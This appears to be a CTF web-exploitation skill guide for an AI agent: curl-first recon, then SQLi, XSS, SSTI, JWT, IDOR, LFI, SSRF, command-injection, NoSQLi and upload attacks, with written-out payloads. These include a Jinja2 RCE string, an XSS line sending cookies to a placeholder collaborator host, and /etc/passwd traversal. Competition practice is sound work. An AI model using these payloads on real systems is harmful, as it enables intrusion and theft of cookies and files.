---
name: ctf-web
description: Solve CTF WEB challenges fast & correctly. Use whenever a challenge gives a URL/website, login page, cookie, robots.txt, "admin panel", HTTP/API endpoint, or mentions SQLi/XSS/SSTI/JWT/IDOR/LFI/SSRF, "bypass auth", or "default creds". Curl-first recon.
---

# CTF Web

Flag format: `flag{...}` (letters/digits/underscores). Scope is STRICT — only the
organisers' own systems. **Curl-first**: most CTF web flags fall to `curl` + header/cookie
manipulation with NO browser. Only open a browser for genuine DOM/JS-runtime or stored-XSS-bot
challenges.

> **Clue-first law:** read `robots.txt` and view-source BEFORE anything clever. The flag is
> very often (a) a constant already in the page, or (b) behind a value the client trivially
> controls (a cookie, a header, a URL param). Spend the first 2 minutes here.

---

## FAST-PATH recon (first 2 minutes — do ALL of these)

```bash
U="https://target.tld"

# 0. The flag may just BE there. Always grep first.
curl -s "$U/" | grep -iao 'flag{[^}]*}'            # constant in HTML? (see Lesson 4)

# 1. Full source + comments + inline JS (devs hide hints/endpoints in comments & JS)
curl -s "$U/" | grep -iE 'flag|secret|todo|admin|debug|key|password|<!--|api|/v1|fetch\('

# 2. Disclosure files — robots & sitemap LIST hidden paths (see Lesson 1)
curl -s "$U/robots.txt"; curl -s "$U/sitemap.xml"

# 3. Response headers: cookies set server-side, framework, redirects, custom X-* headers
curl -sD - "$U/" -o /dev/null

# 4. Linked JS bundles — endpoints, API keys, role names, flag constants
curl -s "$U/" | grep -oE '[^"'\'' ]+\.js' | sort -u          # then curl each & grep

# 5. Common quick wins (one loop)
for p in flag /flag flag.txt /api/flag admin /admin .git/HEAD .git/config \
         .env config.json backup.zip app.js index.js.bak server.js robots.txt; do
  echo "== $p =="; curl -s -o /dev/null -w '%{http_code}\n' "$U/$p"; done
```

What to notice:
- **A `Set-Cookie` with a readable value** (`role=user`, `admin=0`, `isAdmin=false`) → trust-bypass; flip it (Lesson 2).
- **JS that sets `document.cookie` / `localStorage`** → same; the server trusts a client value.
- **`robots.txt`/sitemap naming a path that then returns 401/403** → it exists & is gated; find the gate (cookie? header? `Sec-Fetch-*`? see Lesson 1).
- **`.git/HEAD` returns `ref: ...`** → exposed repo; dump it (see Recon detail).
- **`.env` / `*.bak` / `backup.zip` return 200** → secrets/source; download & grep.

Dir/content brute only if the above dries up (mention — don't auto-run huge lists):
`ffuf -u $U/FUZZ -w wordlist -mc 200,301,302,403` or `gobuster dir -u $U -w wordlist`.

---

## Decision tree — pick the attack by SYMPTOM

| Symptom you observed | Likely bug | Jump to |
|---|---|---|
| My input is reflected in the page unescaped | Reflected/DOM **XSS** | [XSS](#xss) |
| My input is reflected AND `{{7*7}}`→`49` | **SSTI** | [SSTI](#ssti) |
| Login form; error differs for user vs. password | **SQLi** login bypass / auth logic | [SQLi](#sqli) |
| Cookie/localStorage holds `role`/`isAdmin`/`user_type` | **Trust bypass** (client-controlled) | [Auth bypass](#auth-bypass) |
| `Authorization: Bearer eyJ...` / JWT cookie | **JWT** forge | [JWT](#jwt) |
| URL has `?id=3` / `/user/3` and you want #4 | **IDOR** | [IDOR](#idor) |
| Param takes a filename/path (`?page=home`) | **LFI / path traversal** | [LFI](#lfi) |
| Param takes a URL (`?url=`, webhook, "fetch") | **SSRF** | [SSRF](#ssrf) |
| Input hits a shell/ping/convert feature | **Command injection** | [cmdi](#command-injection) |
| JSON login; `{"user":{"$ne":null}}`-ish backend | **NoSQLi** | [NoSQLi](#nosqli) |
| File upload accepted | **Insecure upload** | [Upload](#insecure-upload) |
| Endpoint 403s to curl but page clearly loads it | **Fetch-metadata gate** | [Sec-Fetch](#sec-fetch-gated-endpoints) |

When several fit, prefer the **cheapest, most-trusted-client** path first: constant-in-page →
cookie flip → header replay → injection. Don't build a browser exploit when a curl flag works.

---

## Recon detail

- **Exposed `.git/`**: `curl -s $U/.git/config`; if present, `git clone` via dumper or manually
  fetch `.git/HEAD`, `.git/index`, `.git/objects/...`. Source often contains the flag/creds or
  reveals the gate. (Tools exist — e.g. git-dumper — mention only; manual curl of known objects
  works in a pinch.)
- **Backups / source leaks**: try `index.php.bak`, `app.js.save`, `.swp`, `~`, `.old`, `.zip`.
- **View-source vs rendered**: `curl` shows the *server* HTML (pre-JS). Comments & server-side
  constants live here. For values written by JS at runtime, read the JS files (step 4) — you
  rarely need a real browser to see what a `fetch()` or cookie-setter does.
- **Headers as oracles**: `Server`, `X-Powered-By`, framework cookies (`connect.sid`=Express,
  `PHPSESSID`=PHP, `csrftoken`+`sessionid`=Django) tell you the SSTI engine / injection dialect.

---

## Auth bypass

**Client-set role cookies (Lesson 2 — try this FIRST on any auth gate).** Many CTF apps gate
`/admin` on a cookie the homepage JS set itself. Flip it:

```bash
curl -s $U/admin -b 'role=admin'                         # the Elmo win
# sweep the usual privileged names/values:
for kv in role=admin admin=true admin=1 isAdmin=true is_admin=1 \
          user_type=admin auth=admin level=9 debug=true; do
  echo "== $kv =="; curl -s $U/admin -b "$kv" | grep -iao 'flag{[^}]*}'; done
```
Also check `localStorage`/`sessionStorage` the page sets (read the JS), and hidden form fields
(`<input type=hidden name=role value=user>` — resubmit as `admin`).

**Default / weak creds**: `admin:admin`, `admin:password`, `admin:admin123`, `root:root`,
`guest:guest`, plus anything hinted on the page. Try a handful by hand — do NOT brute-force.

---

## SQLi

**Login bypass (Lesson 3 — the SUBTLE one).** On `POST /login` with `email`+`password`:

```bash
# WRONG for CTFs: logs in, but as the first/arbitrary row -> often NO flag.
curl -s $U/login --data-urlencode "email=' OR 1=1 -- " --data "password=x"

# RIGHT: target the SPECIFIC victim so the query returns THEIR row (the flag lived on
# that account). Comment out the password check with the trailing "-- " (note the space).
curl -s $U/login --data-urlencode "email=victim@host.com' -- " --data "password=x"
```
**Why it matters:** `' OR 1=1 -- ` returns *many* rows; the app takes the first (wrong user, no
flag). `victim@host' -- ` makes the WHERE match exactly the victim, so you log in as them and
see their flag. Read the challenge for whose account to impersonate (e.g. "Dr. House").

**Other SQLi:**
- UNION read: find column count with `ORDER BY n` / `UNION SELECT NULL,NULL,...`, then
  `UNION SELECT 1,flag,3 FROM flags-- `. Enumerate via `information_schema.tables/columns`
  (MySQL/PG) or `sqlite_master` (SQLite).
- Boolean-blind: `' AND 1=1-- ` vs `' AND 1=2-- ` (page differs). Time-blind: `' OR SLEEP(5)-- `
  (MySQL) / `pg_sleep(5)` / `randomblob` (SQLite).
- `sqlmap` exists for blind grinds (mention) — but hand-craft first; it's faster and cleaner for
  the typical CTF single-param bug.

---

## XSS

Fingerprint: your input appears in the response *unescaped* (Lesson 1 reflected `?q=`). Probe
`"><b>x</b>` / `'"><svg onload=alert(1)>`; if `<b>` renders, it's live XSS.

- **Reflected/DOM**: usually just proof-of-concept for points, OR the vector to make a
  **same-origin `fetch('/flag')`** fire from the page. BUT before writing JS: if `/flag` is only
  gated on fetch-metadata, you don't need XSS at all — **replay the headers with curl** (see
  [Sec-Fetch](#sec-fetch-gated-endpoints), Lesson 1). Browser only for a real admin/XSS bot.
- **Stored XSS + admin bot**: when a bot with a cookie/secret visits your input, exfiltrate via
  `<script>fetch('//YOUR-COLLAB/?'+document.cookie)</script>` (collaborator must be in scope).
- **Filters**: no-CSP pages take anything; otherwise try event handlers (`onerror`, `onload`),
  `javascript:` URIs, case/encoding tricks, `<img src=x onerror=...>`.

---

## SSTI

Fingerprint with math, then narrow the engine, then escalate **within scope**:

```
{{7*7}}  -> 49     => Jinja2 (Python) / Twig (PHP)      $ {7*7} -> 49 => FreeMarker/Velocity/Spring EL
{{7*'7'}}-> 7777777 => Jinja2   |  -> 49 => Twig
```
Polyglot probe to trigger an error/eval across engines: `${{<%[%'"}}%\` (watch the response).

- **Jinja2 read/RCE**: `{{ config }}`, `{{ cycler.__init__.__globals__.os.popen('id').read() }}`,
  or `{{ self.__init__.__globals__.__builtins__.open('/flag').read() }}`. Flag is usually just a
  file: try `cat /flag`, `/flag.txt`, `ls /`.
- **Twig**: `{{ _self }}`, `{{ ['id']|filter('system') }}`.
- Confirm the engine before firing RCE — the same probe can succeed in multiple engines, so don't
  conclude from one response. Keep every command on the in-scope target only.

---

## JWT

Decode first: `echo <token> | cut -d. -f1,2 | tr '_-' '/+' | base64 -d 2>/dev/null`.
- **`alg:none`**: set header `{"alg":"none"}`, keep/escalate claims (`"admin":true`,
  `"role":"admin"`), empty signature (`header.payload.`). Try case variants `None`/`nOnE`.
- **Weak HS256 secret**: crack offline — `hashcat -m 16500 token.jwt rockyou.txt`, or try obvious
  secrets (`secret`, app name, `password`). Then re-sign forged claims.
- **RS256→HS256 key confusion**: if you have the server's RSA *public* key, sign HS256 using that
  public key as the HMAC secret.
- `jwt_tool <token> -X a` (alg:none), `-C -d wordlist` (crack), `-X k` (key confusion) automate
  these (mention).

---

## IDOR

Increment/change the identifier and watch for someone else's data:
`curl -s $U/api/user/1`, `/2`, `/3`... or `?id=`, `?account=`, UUIDs you can guess/leak, filenames
(`/invoice/1001.pdf`). Flip your own cookie's `id` too. The flag is whichever object you weren't
meant to read.

## LFI

Param that names a file/page (`?page=home`, `?file=`, `?lang=en`):
```
?page=../../../../etc/passwd            # confirm traversal
?page=../../../../flag  /flag.txt       # grab the flag file directly
php://filter/convert.base64-encode/resource=index.php   # leak PHP source (then decode)
```
Try null-byte/encoding bypasses on naive filters (`..%2f`, `....//`). Log-poisoning → RCE is
possible but overkill for most CTFs; read the flag file first.

## SSRF

Param that fetches a URL (`?url=`, `?img=`, webhook, "import from URL"):
- Hit internal: `http://127.0.0.1:<port>/`, `http://localhost/admin`, cloud metadata
  `http://169.254.169.254/latest/meta-data/` (only if in scope).
- Bypass filters: `http://127.1`, `http://[::1]`, decimal IP, `@`-tricks, redirects.

## Command injection

Input feeding a shell (ping, nslookup, image convert, "run"):
`; id`, `| id`, `$(id)`, `` `id` ``, `%0a id`, `& ping -c1 x`. Blind? use time (`; sleep 5`) or
out-of-band DNS. Then `cat /flag`.

## NoSQLi

JSON/Mongo login. Operator injection to bypass auth:
`{"user":"admin","pass":{"$ne":""}}` or `{"$gt":""}`; in query-string form
`user[$ne]=&pass[$ne]=`. `$regex` to extract char-by-char when needed.

## Insecure upload

Get a script to execute: upload `shell.php` (or `.phtml`, `.php5`, `.jsp`, double-ext
`x.jpg.php`, content-type spoof, magic-byte prefix). Find where it lands (recon the upload dir),
then browse it to run `cat /flag`. If only images: try polyglot or path traversal in the filename.

---

## Sec-Fetch-gated endpoints

**Lesson 1 — the reusable insight.** An endpoint (`/flag`) that 403s to plain curl but is loaded
fine by the page is often gated on **fetch-metadata headers** the browser sends and page JS
cannot forge: `Sec-Fetch-Site: same-origin` + `Sec-Fetch-Dest: empty` + `Sec-Fetch-Mode: cors`
plus a same-origin `Referer`/`Origin`. You do **not** need a live XSS or admin bot — just send
those headers yourself.

```bash
python3 -I scripts/secfetch_replay.py "$U/flag"
python3 -I scripts/secfetch_replay.py "$U/flag" --cookie "role=admin" \
        --referer "$U/dashboard"
# if rejected, vary the trio (top-level nav style):
python3 -I scripts/secfetch_replay.py "$U/flag" --site none --dest document --mode navigate
```
The script prints status + body and auto-greps `flag{...}`. Equivalent raw curl:
```bash
curl -s "$U/flag" -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Dest: empty' \
     -H 'Sec-Fetch-Mode: cors' -H "Referer: $U/" -H "Origin: $U"
```

---

## Flag extraction & verification

- Grep every response body and any leaked file: `grep -riaoE 'flag\{[A-Za-z0-9_]+\}'`.
- Beware **encoding/entities**: a flag may be base64, URL-/HTML-encoded, or split across the DOM.
  Decode (`base64 -d`, `python3 -c 'import urllib.parse...'`) and re-grep. Watch for HTML
  entities (`&#123;` = `{`) and ligatures that break the regex.
- **Verify format** before submitting: `^flag\{[A-Za-z0-9_]+\}$`. If the challenge states a
  different wrapper, match exactly. Submit the single confirmed flag — no guessing, no brute.
- Note what worked (cookie flip / Sec-Fetch replay / targeted SQLi) for the writeup.
